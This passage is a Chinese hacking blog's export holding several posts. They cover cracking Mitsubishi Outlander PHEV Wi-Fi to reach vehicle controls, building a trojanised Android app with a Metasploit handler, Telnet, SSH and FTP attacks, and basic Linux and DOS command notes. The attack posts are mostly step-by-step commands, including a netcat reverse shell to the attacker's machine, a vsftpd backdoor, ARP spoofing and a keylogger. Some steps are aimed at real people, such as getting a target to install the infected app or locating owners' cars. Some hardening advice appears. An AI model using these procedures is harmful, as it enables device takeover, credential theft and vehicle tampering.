“受保护”的车辆。\n入侵三菱欧蓝德PHEV近年来，汽车已经变得越来越复杂。大多数汽车现在都有许多集成电路（IC）和大量的软件，既可以优化车辆的运行（例如燃料和氧气消耗、防抱死制动、自动感应和制动系统等），也可以为车主提供便利。随着这种复杂性和先进性的增加，脆弱性也随之增加了。 \n最近，来自英国Pentest Partners的白帽黑客注意到，三菱Outlander PHEV有一个应用程序，司机可以通过车内的Wi-Fi接入点（AP）进行连接。通常情况下，这种应用程序应该是要通过GSM或云技术连接来访问这车辆的控制系统的。而在欧蓝德上，则可以通过这个Wi-Fi接入点来访问一些车辆控制系统，包括报警系统、充电系统、灯光、风扇和温度控制等。 \n这意味着，如果我们或小偷能够连接到这个内置在车辆中的无线AP，那么盗窃报警系统就可以被禁用，以及做一些其他事情。使这辆车更加脆弱的是Wi-Fi的安全设计，或者说，安全实施不严格。 \n它存在以下几个明显的安全问题： \n\nWiFi接入点的密码记录在了车主手册中。 \n\n接入点的SSID都符合 “REMOTEnnaaaa “的规律，其中 “n “是任何数字，”a “是任何小写字母。 \n\n密码相对较短且简单，使其容易被暴力破解。\n\n\n寻找脆弱的三菱欧蓝德目标这款三菱欧蓝德的销量超过10万辆，所以你身边很可能就有一辆。当然，你可以简单地走在街上寻找它们，或者你可以按照这辆车所特有的SSID模式进行自动搜索。 我们可以使用无线地理记录引擎www.wigle.net（wigle.net对WiFi AP进行编目，并通过GPS坐标对其进行索引）。 \n在那里，我们可以使用Outlander的SSID的字符串模式，并选择按SSID搜索。当我这样做时发现了许多目标在wigle.net上搜索时，搜索字符串 “REMOTE______”，其中6个下划线代表：2个数字和4个字 母，如下所示。 \n\n正如你在下面看到的，我找到了许多符合这种模式的AP，大多数在西欧。我们可以通过在wigle.net中加入我们的GPS坐标来细化我们的搜索，以找到你所在地区的车辆。\n\n入侵欧蓝德的AP一旦我们找到了三菱欧蓝德，下一步就与任何使用aircrack-ng和hashcat的无线AP破解非常相似。首先，我们连接到AP，然后在4路握手包中提取获得密码哈希值，最后，开始暴力破解。让我们开始吧!\n首先，我们将使用Kali Linux 和aircrack-ng。我将使用一个旧的Alfa AWUS036H USB无线适配器，当然你可以使用任何你喜欢的兼容kali的无线网卡 \n第一步是检查无线连接。\niwconfig\n\n\n确定我的无线适配器是wlan0。 \n然后，我们需要将无线适配器调至监听模式\nairmon-ng start wlan0\n\n\n这里要注意的是，这个过程会无线适配器的名称改为mon0。 \n接下来，我们需要开始捕捉周围的无线流量。\nairodump-ng mon0\n\n\n\n\n正如你在上面的截图中所看到的，我们可以看到三菱的AP名为REMOTEaa1234。这就是我们的目标AP。 \n接下来我们需要在该信道上捕获该AP，并将捕获的PSK写入一个名为carhack的文件中。\nairodump-ng --bssid &lt;the AP BSSID&gt; -c &lt;the AP channel&gt; --write carhack mon0\n\n\n\n\n当车主连接到车上的AP时，我们在4路握手中捕获密码哈希值。 \n如果车主是已经连接的状态，可能就需要使用 aireplay-ng 的 deauth 功能来踢掉他们，当他们重新连接时，就可以捕获哈希值。 \n最后一步是破解这个哈希值。Aircrack-ng在破解WPA-PSK的哈希值方面不是特别好，但幸运的是，hashcat在这方面足够强大。 \n我们可以使用以下命令将cap文件carhack.cap转换为可用于hashcat的格式（.hccap）。\naircrack-ng &lt;the aircrack .cap file&gt; -J &lt;the hashcat .hccap file&gt;\n\n\n转换好的文件可以直接使用hashcat进行破解。\nPentest Partners的人用一台普通的单CPU笔记本电脑花了四天时间，但是用多个CPU，一个GPU集群或基于云的资源，你可以在几个小时内破解它。一旦我们用破解的PSK连接到欧蓝德的AP，我们就可以对车辆进行破坏和操作。\n结语此篇由3部分组成的文章只简述了入侵汽车的最基础知识，适合新手了解最基础进攻流程和概念。算了，玩的开心。\n得出结论，汽车安全方面的漏洞其实很多都是为了便利人们所造成的结果。就和web的漏洞很像，可能是因为这方面没有得到很好的重视所导致的。\n\n","slug":"汽车黑客入门","date":"2021-10-26T05:51:57.000Z","categories_index":"汽车黑客","tags_index":"汽车黑客入门","author_index":"Longw"},{"id":"46cf636a853cf895eb01f079c7dbe74c","title":"安卓远控","content":"\n\n\n\n写一点大家喜欢看的东西。。。。。。\n安卓远控远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术，这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。\n这次的安卓远控就是将正常的app嵌入恶意代码，当你安装这个app并且运行，那么我就能在网络上监控你。\n这个是在github上的开源的项目，地址是：https://github.com/cleverbao/520apkhook\n话不多说，打开kali，直接克隆。\n安装git clone https:&#x2F;&#x2F;github.com&#x2F;cleverbao&#x2F;520apkhook.git\n\n安装完成要注意你的kali的jdk版本必须为jdk1.8，这样才能运行这个程序。如何安装修改，我们直接百度。\nJava -version   #查看java版本\n\n使用cd 520apkhook\n\n我们打开文件夹，这个文件夹下面有一个Move to iOS_v3.2.0_apkfab.com.apk ，这是作者给你测试的软件。我们先将他重命名一下，改为随你便，我这里是：ceshi.apk\n在上面的基础上\npython3 hook.py --lhost &lt;kaliIP地址&gt; --lport 1433 -n .&#x2F;ceshi.apk\n\n然后，如果你环境满足的话，直接会到写那个，输入证书信息部分。\n[*] 创建app签名文件!\n您的名字与姓氏是什么?\n [Unknown]:  zhouhongyi\n您的组织单位名称是什么?\n [Unknown]:  360\n您的组织名称是什么?\n [Unknown]:  qihu360\n您所在的城市或区域名称是什么?\n [Unknown]:  beijing\n您所在的省&#x2F;市&#x2F;自治区名称是什么?\n [Unknown]:  beijing\n该单位的双字母国家&#x2F;地区代码是什么?\n [Unknown]:  china\nCN&#x3D;zhouhongyi, OU&#x3D;360, O&#x3D;qihu360, L&#x3D;beijing, ST&#x3D;beijing, C&#x3D;china是否正确?\n [否]:  y\n\n按照上面的填就行了，没有黑360的意思。完成后，会直接生成一个叫Final_Infected.apk 和 handler.rc 的程序和文件。那么这个时候就是展现你能力的时候了。让你的目标下载安装并且运行这个Final_Infected.apk 。\n那么当他运行时，我们在kali中就会收到会话。\nmsfconsole -r handler.rc\n\n直接运行脚本了，接下来当对方运行时。我们会收到会话。\nsessions -l   #查看会话\nsessions 1   #使用会话\n\n成功了，就能进行远程控制了。\n我借室友的手机实测了一下，在同一个wifi下，连接没有什么问题。并且安装app时，手机并没有报杀毒之类的。用了一下成功获得室友手机上安装的app的名单。那么接下来就有很多操作空间了。\n下一篇，就写最近看到的汽车黑客。\n\n","slug":"安卓远控","date":"2021-10-25T12:10:12.000Z","categories_index":"远控","tags_index":"github","author_index":"Longw"},{"id":"ee30e4a54bdc40c81ca3faa91eadc5d4","title":"Telnet漏洞","content":"\n\nTelnet介绍(直接复制粘贴)  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。\n  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。\n  Telnet服务端默认情况下使用23端口。\nTelnet版本获取使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。\nnmap -p23 -sV IP地址   #对IP23号端口进行探测\n\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun\n\nTelnet密码破解使用metasploit下针对telnet破解的模块进行用户名和密码的破解。\nmsfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun\n\nTelnet登录测试使用破解好的账户名和密码进行登录测试，并执行相应的命令。\n接上面的操作\nsessions -l \nsessioms -i id\n\nTelnet客户端连接Telnet服务器Windows下开启telnet客户端，连接telnet服务端。\ncmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录\n\nTelnet明文密码传输使用wireshark抓取telnet数据包\n在kali使用arp欺骗win10自己是主机，然后使用win10连接msf\n通过kali的wireshark抓包获取信息，通过分析找出密码，账号。\nmsf登录Telnet在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1\n\nmsf连接shell下载exp\n使用wget进行下载\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\n\n但是，这么下载好像不行。所以我们通过kali搭建环境下载。\n再开启一个终端\ncd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start \n\n然后，我们回到msf会话中\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载\n\n设置kali nc 监听\n使用netcat进行监听，后期返回的shell\nnc -lvp 4444\n\n我们要对程序进行编译执行exp，获取root权限\n再会话中\ngcc test.c -o exploit\n\n这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。\nrm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一\n\n执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。\nrm /tmp/run\nrm exploit\n有些操作前面写过不截图了，方便。其他操作自己看着办吧。\n\n","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"68847bc4d9b92f6bbe7e25411fa69ec3","title":"ssh漏洞利用","content":"\n\nSSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\nSSH安装我们使用ubuntu下载openssh_service服务\nsudo apt-get install openssh-server \n\n完成后使用以下命令开启关闭ssh服务\nservice ssh start #启动ssh服务\nservice ssh status #状态获取\nservice ssh stop  #关闭ssh服务\n\nSSH客户端安装使用ubuntu搭建ssh客户端\nsudo apt-get install putty-tools\n\n然后太ubuntu的软件中心找到putty并且安装，之后使用客户端连接服务端。\nSSH banner信息获取\nnmap获取ssh banner信息\n\nnmap -sV -p 22 IP地址\n\n\nmetasploit获取ssh banner信息\n\nmsfconsole\nuse auxiliary&#x2F;sacnner&#x2F;ssh&#x2F;ssh_version    \nset rhosts IP地址\nset rport 22\nrun\n\n\nnc获取ssh banner 信息\n\nnc IP地址 22\n\n配置ssh规避banner信息在ssh配置文件sshd_config中新增一行\nDebian Banner no  再次扫描就没有操作系统信息\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\ncrtl+f 输入banner 在下面加上\nDebian Banner no  保存\nsevice ssh restart \n\nmedusa ssh 弱口令破解如果在设置ssh服务时，管理员设置了容易破解出来的用户名和密码，那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。\nmedusa\nmedusa -d   #查看支持模块\nmedusa -h IP地址 -u 用户名 -p 字典路径 -M 模块   #进行破解\nsucess表示破解成功\n\nSSH命令行工具登录一般情况下Linux下都具有ssh客户端，用来登陆ssh服务端。可以使用ssh用户名@IP地址，然后根据提示输入密码。（默认22端口）\nssh 用户名@IP地址\n\nmetasploit利用ssh登陆反弹shell使用metasploit可以进行ssh登陆(破解)，会自动建立对应的Bash shell连接。\nmsfconsole\nuse auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\nset rhosts IP地址\nset username xxx\nset password xxx\nrun\n成功后\nsessions -l\nsesssions -i 1\n成功登陆\n\nmetasploit获取meterpreter shell利用获取的Bash shell，注入metasploit中meterpreter payload从而获取更强大功能的shell。\nsessions -u 1\nsessions -i id\n使用后面登陆成功\nhelp  #查看可以使用的命令\n\nSSH安全防御\nssh修改默认端口\n\ncd &#x2F;etc&#x2F;ssh\nsudo gedit sshd_config\nctrl+f  找端口port\n将端口port修改为其他端口，如：2222\nservice ssh restart  重启ssh服务，使修改生效\n\n\nssh设置pgp登陆\n\n在默认情况下，ssh使用用户名和密码进行远程登陆，但也可以使用密钥对进行身份验证登录。(公钥和私钥)\n生成ssh密钥对，使用puttygen\n下载：https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html  可能不对，直接360下载。ok\n打开puttygen生成私钥，保存到桌面private.ppk。使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys.并复制私钥文件到.ssh目录下。使用putty -l命令将内容拷贝到authorized_keys中。之后通过putty加载私钥文件进行ssh连接。\nssh-keygen -t rsa  之后一之前确定，自动生成.ssh目录\nls -alh  查看所有文件\ncd .ssh \ntouch authrized_keys   生成文件\n将private.ppk拷贝到.ssh目录下\nputtygen -L private.ppk   查看内容，之后我们将内容复制\ngedit authorized_keys   打开后，我们将复制内容放进去\n\n完成后使用win10刚刚360下载好的putty客户端加载私钥文件进行连接。\n在Auth里加载文件。\n输入IP地址和端口（刚刚已经改为了2222）\n直接连接。\n\nssh防御暴力破解用户账号\n\n在Linux下可以配置不能使用用户名和密码登陆。只使用ssh pgp方式验证登陆。规避了ssh暴力破解。\n问题：不适用用户名和密码登陆，很大程度上存在复杂操作问题。\ncd &#x2F;etc&#x2F;ssh&#x2F;\nsudo gedit sshd_config\nctrl+f  输入password Authentication\n将yes改为no  保存退出\nservice ssh restart  重启服务\n\n\nIptable设置阈值防止暴力破解\n\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -mrecent --set\nsudo iptables -I INPUT -p tcp --dport 2222 -i eth0 -m state --state NEW -m recent --updata --seconds 120 --hitcount 3 -jDROP  #3次密码不对就暂停连接120秒，也可修改时间\nservice ssh restate  #重启服务\n\n表示连接3次不对，停止接收数据包防止暴力破解。最好还是要设置复杂密码，防止被字典跑出来。\n毕竟我曾经在群里看到一个变态跑了一年跑出来了。。。。。。。\n因为安全方面设置好了，前面就没有截图。不过步骤都写的很清楚了。。。\n\n","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"add830c1c066eef908d48bdb9bf71238","title":"FTP漏洞利用","content":"\n\n​                                     开始记录一个安全漏洞利用\nFTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。\nFTP用户分类\nReal    一般用户   \n\nAdministrator  管理员\n\nAnonymous    匿名用户\n\n\nFTP文件传输格式\nASCII\n二进制格式\n\n利用FTP匿名登陆漏洞由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。\n本次靶机是windows2003企业版     攻击机为kali\n\n打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务\n\nnmap IP地址   \n\n\n扫描完成，发现开启了21号端口\n\n使用nmap进行漏洞扫描\n\nnmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本\n\n\n显示有匿名登陆漏洞，直接使用nc测试。\n\n使用nc进行FTP登陆\n\nnc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录\n\n\n成功登录靶机。\n利用FTP后门漏洞vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。\n本次靶机Metasploittable2-Linux     攻击机kali\n这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本\n\nnc连接\n\nnc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入\n\n\n发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口\n\nnc连接后门\n\nnc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户\n\n\n成功连接后门，并且拥有root权限。\nFTP安全配置\n修改配置文件，禁止匿名登录\n在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉\n在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词\n\n对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口\n打补丁直接更新版本就行\n禁止连接看下面的命令\niptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP\n\nFTP用户名密码暴力破解Windows下cmd命令添加用户，并提升为Administrator管理员权限\nnetuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组\n\nWindows下使用FTP服务器添加用户操作\n打开IIS服务，找到FTP，添加用户\n使用medusa暴力破解FTP登录\n本次靶机Windows2003企业版    攻击机kali\nmedusa -d    #查看可以使用的模块\n\n\n发现有FTP模块，利用FTP模块进行暴力破解\nmedusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解\n\n\n破解成功，发现用户名admin，密码admin测试登录看看。\n\n成功利用破解的用户名和密码登录。\nFTP用户名明文密码的验证FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。\n打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。\n\n接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.\n\n\n发现明文暴露出连接账户和密码信息，成功验证。\nFTP用户名密码明文嗅探刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？\n我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。\n打开终端使用arpspoof脚本\narpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102\n\n欺骗开始后不要动。。。。。。\n打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。\n打开kali另一终端，输入命令：ifconfig   查看mac地址\n再到win10中查看网关mac地址\n00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址\n\n发现一样，欺骗成功。\n在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。\nftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   \n\n登陆完成后，查看wireshark中中抓取的数据包。\n\n\n成功获得用户名和密码。。。。。。\nFTP登陆之后的事情讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。\nmsfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听\n\n生成的payload在/root/.set里面\ncd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面\n\n之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。\nsessions -l   #查看会话\nsessions -i x  #选择连接x号会话\n\nhelp   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录\n\n\n键盘输入情况演示\n因为图片加载不出来，自己试试看就知道了，这边就不放图片了。\n当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！\n防御\n禁止匿名用户登陆\n及时更新版本，防止老版本漏洞\n设置连接次数防止暴力破解\n密码明文，所以最好不适用FTP，用其他类似替代\n\n\n","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","categories_index":"安全漏洞基础","tags_index":"基础漏洞","author_index":"Longw"},{"id":"5edbb0bb0225a5f787cc77b6741890ba","title":"Linux命令","content":"\n\nLinux命令学了好久了，还是不好记住，写个笔记方便查看吧。\n\nRed Hat专属快捷键ctrl+alt+F2   #切换为字符界面(F2~F7个命令行界面)\nctrl+alt+F1   #切换为图形界面\n\n基础命令快捷键反斜杠\\    #强制换行\nTAB    #自动补齐\nCTRL+U  #清空至行首\nCTRL+K  #清空至行尾\nCTRL+L  #清屏\nCTRL+C  #取消本次命令编辑\nxx --help  #查看xx的帮助信息\nman ls   #查看帮助\nuname -r  #查看内核\nuname -a  #查看系统\nwhich uname #当前目录\nhostname   #查看主机名\nifconfig  #查看网卡信息\ncat &#x2F;proc&#x2F;cpuinfo   #查看cpu信息\ncat &#x2F;proc&#x2F;meminfo   #查看内存信息\nreboot  #重启\nshutdown -h now   #立刻关机\npwd   #查看当前目录\n\ncd命令   切换目录cd    #切换目录\ncd &#x2F;etc&#x2F;httpd    #绝对路径\ncd abc    #相对路径\n\nls命令   查看文件ls  #查看目录的文件\nls -l  #详细查看\nls -a  #查看全部文件\nls -h  #察看文件大小\nls -alh  #就上面全部\n\ndu命令   查看文件大小du  #查看当前文件夹大小\ndu -a   #统计时包括所有文件，不仅仅只统计目录\ndu -h   #以更易读懂的字节单位(k,m等)显示信息\ndu -s   #只统计每个参数所占用的空间总的大小\n\nmkdir命令   创建目录mkdir   #创建新目录\nmkdir -p &#x2F;路径名&#x2F; 目录名   #创建目录\n\ntouch命令  创建文件touch  #新建空文件或更新文件时间标记\ntouch 文件名  #新建文件\n\nln命令   建立连接ln    #为文件或目录建立链接(link)\nln -s 源文件或目录 -----&gt; 链接目录   #创建链接\n-s表示建立符号链接文件(省略此项则建立硬链接)\n\ncp命令   复制文件cp   #复制文件或目录\ncp 【选项】 源文件目录 目标文件目录  \n-r  #递归复制整个目录\n-f   #强制覆盖目标同名文件或目录\n-p   #保持源文件的属性不变\n-i   #需要覆盖文件或目录时进行提醒\n\nrm命令   删除文件rm   #删除\nrm 【选项】 文件目录\n-f  #强制删除文件&#x2F;目录,不进行提醒\n-i  #删除文件或目录时提醒用户确认\n-r  #表示递归\n\nmv命令   移动文件mv 【选项】 源文件&#x2F;目录 目标文件&#x2F;目录   #移动文件\n-b   #当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i   #如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f   # 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n   #不要覆盖任何已存在的文件或目录。\n-u   #当源文件比目标文件新或者目标文件不存在时，才执行移动操作\n\nfind命令     查找文件find   #用于查找文件或目录\nfind 查找范围 查找文件\n-name  #按照文件名查找\n-size #按照文件大小查找\n-uesr #按照文件属主查找\n-type #按照文件类型查找\n\nvi命令   编辑文件vi   #表示进入\nvi 【选项】 【t[n]】 【file】\n-r   #用于恢复系统忽然崩溃时正在编辑的文件\n-R   #用于只读方式打开文件\n+n   #用来指明进入vi后直接位于文件的第几行，如不指定n则位于最后一行\na  #在光标后附近文本\nA  #在本行行末附加文本\ni  #在光标前插入文本\nI  #在光标开始时插入文本\no  #在光标下插入新行\nO  #在光标上插入新行\n&#x2F;string 向下 向前搜索指定字符串搜索时忽略大小写\n？  向上\nn  搜索指定字符串的下一个出现位置\n:%s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #全文替换为指定字符串，g表示不提示，s表示搜索，%表示全部\n:n1,n2s&#x2F;查找内容&#x2F;替换内容&#x2F;g   #在一定范围替换指定字符串，n1到n2行\nU  #返回的上一步\n:set nu   #显示行号\n:q    #直接退出\n:wq   #保存后退出\n:q!   #强制退出\n:.   #重复上一个命令\nD   #光标到行尾全部删除\ndd   #删除光标在的那一行\np   #粘贴dd删除的那一行\n\ncat命令   查看文件cat   #显示文件的全部内容\n-n   #给输出的所有行加上编号\ncat 1 2 &gt; 3   #合并文件\n\nwc命令    统计文件内容wc   #统计文件中的单次数量字节数行数\n-I  #统计行数\n-w  #统计单词数\n-c  #统计字符数\nwc sdxh.txt   #会出现 2 4 26,2是行数，4是单词数，26是字符数\nhistory   #查看历史命令\n\ngzip和bzip2命令  压缩文件gzip   bzip2   #都是归档和压缩文件命令\n只针对单个文件压缩\n-g   #显示高压缩比\n-d   #释放压缩文件\ngzip 文件名 压缩文件     #格式为后缀有.gz\nbzip2 文件名 压缩成的文件名  #格式为 文件.bz2,他相对于gzip压缩率更高\n\ntar命令   解压压缩文件tar\ntar -tvf 4.tar -r   #追加TAR文件到归档结尾\ntar -rvf 4.tarr 5   #把5加入到4.tar\n-p  #解包时保留原始文件及目录的权限\n-C  #解包时指定释放的目录文件夹\n-z  #调用gzip程序进行解压或压缩\n-j  #调用bzip2程序进行解压或压缩\ntar -cvzf test.ter.gz 被压缩的文件1 被压缩的文件2   #创建归档压缩文件后缀为bz2\ntar -xvzf test.tar.gz -C &#x2F;usr&#x2F;src  #解压释放归档到&#x2F;usr&#x2F;src里面\ntar -xvjf test.tar.bz2 -C &#x2F;usr&#x2F;src   #解压释放归档到&#x2F;usr&#x2F;src里面\n-c   #创建归档文件扩展名为.tar\n-v   #输出详细信息\n-f   #表示使用归档文件    如-cvf   创建归档文件\ntar -cvf 4.tar 1 2 3   #将文件1 2 3 打包归档为4.tar\ntar -xvf 4.tar    #解包归档文件4.tar\n-xvf   #解包归档文件\n-x    #解开归档文件\n-t    #列表查看包内文件(不释放解包)\n\nchmod 命令   修改权限chmod 777 文件名   #提升权限\nr     #4  表示读\nw    #2  表示写\nx    #1  表示可执行 \n777   #表示任何人都拥有所有权限\n\n编译安装过程下载源代码安装文件包文件\n1： tar解包\n2： .&#x2F;configure配置\n3： make编译\n4： make install 安装\n\napt-get命令   安装apt-get install xxx   #安装xxx,直接从网上下载\ndpkg -i xx   #安装xx，Debian软件包\ndpkg -l xx   #列出与xx有关软件\ndpkg -r xx   #删除\n\nuseradd命令   添加用户useradd [选项] 用户名\n-u  #指定uid标记号\n-d  #指定宿主目录\n-e  #指定账号失效时间\n-g  #指定用户的基本组名(或uid号)\n-G  #指定用户的附加组合名(或Gid号)\n-M  #不为用户建立并初始化宿主目录\n-s  #指定用户的登录shell\n\nuserdel命令    删除账号userdel -r 用户名   #表示连用户的宿主目录一并删除\n\nifconfig命令   查看网络接口信息-eth0   #以太网，局域网\n-lo    #(虚拟)回环设备\nppp0   #使用ppp协议的串口设备(通常指调制调解器)\ntr0   #令牌环(Token Ring)\nfddi0  #光纤\nifdown eth0  #禁用网络接口\nifup eth0   #启用网络接口\n\nnetstat命令   查看网络连接情况netstat [选项]\n-a  #显示所有活动连接\n-n  #以数字形式显示\n-p  #显示进程信息\n-t  #查看tcp协议相关信息\n-u  #查看udp协议相关信息\n-r  #显示路由表信息\n\nroute命令     查看路由表条目route [选项]\n-n   #查看路由表条目\nroute del default gw IP地址   #删除路由表中的默认网关记录\nroute add default gw IP地址   #像路由表添加默认网关记录\nroute add -net 网段地址&#x2F;24 gw IP地址  #添加到指定网段的路由记录\nroute del -net 网段地址&#x2F;24 gw IP地址  #删除到指定网段的路由记录\n\nseivice命令    服务命令service xx start  #启动xx服务\nservice network restart  #重启network网络服务\nservice xx stop   #关闭xx服务\n\n基本上会上面这么多就差不多了。放个链接地址方便继续学习：https://www.linuxcool.com/\n","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","categories_index":"Linux基础","tags_index":"Linux命令","author_index":"Longw"},{"id":"08b6393a58e95b9436d0c70886fad74f","title":"DOS命令","content":"\n\n常用的DOS命令身为IT人士，怎么能对windows的基本命令不知道呢？来跟我一起学习一下。\n\n来！我们win+r输入cmd进去：\n\n入门命令这黑白对比不是太好看。看一下第一条命令，教你怎么变色;\ncolor  【选项】       # 改变cmd字体颜色\n\ncolor -h   #查看帮助\n\n\n都是中文应该都看得懂的，不懂我们试试嘛：\ncolor a      #变成绿色\n\n\n我靠，兄弟你绿了!\n\n\n这下这条命令都懂了，改变颜色，选项能用 -h  查看。想变什么颜色自己选，嘿嘿嘿！！！\n上面的字有点多，看起来不是太舒服，来看一下清屏命令：\ncls     #清空前面命令页面\n\n\n可以看到鼠标不能往上拉了，说明以前的命令等已经被清空了。下面我们进入重点。\n常用的DOS命令ping命令ping   IP&#x2F;域名     